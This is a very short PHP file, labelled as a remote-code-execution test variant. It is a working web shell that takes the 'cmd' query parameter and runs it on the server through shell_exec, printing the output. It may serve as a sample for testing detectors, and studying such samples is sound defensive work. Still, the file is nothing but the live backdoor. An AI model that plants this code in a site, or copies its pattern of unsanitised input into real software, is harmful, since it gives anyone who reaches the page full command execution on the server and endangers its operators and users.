<?php
// RCE test variation #755
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>